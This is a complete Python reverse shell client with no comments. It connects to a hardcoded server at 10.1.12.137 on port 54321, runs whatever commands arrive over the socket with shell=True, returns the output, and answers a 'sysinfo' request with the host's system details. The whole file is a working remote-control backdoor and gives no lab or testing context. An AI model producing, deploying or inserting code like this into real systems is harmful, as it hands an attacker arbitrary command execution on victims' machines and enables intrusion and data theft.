import socket
import subprocess
import platform
import os

SERVER_IP = "10.1.12.137"
PORT = 54321

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return e.output

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))

    while True:
        data = s.recv(1024)
        if not data:
            break

        cmd = data.decode().strip()

        if cmd == "exit":
            break

        elif cmd == "sysinfo":
            info = f"""
System: {platform.system()}
Node: {platform.node()}
Release: {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
"""
            s.send(info.encode())

        else:
            output = execute_command(cmd)
            s.send(output)

    s.close()

if __name__ == "__main__":
    main()
